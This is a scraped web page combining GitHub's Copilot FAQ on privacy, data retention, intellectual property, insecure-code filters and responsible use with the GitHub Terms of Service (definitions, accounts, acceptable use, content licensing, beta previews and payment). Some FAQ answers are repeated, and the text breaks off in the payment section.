GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).

GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If you’d like to use GitHub’s trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
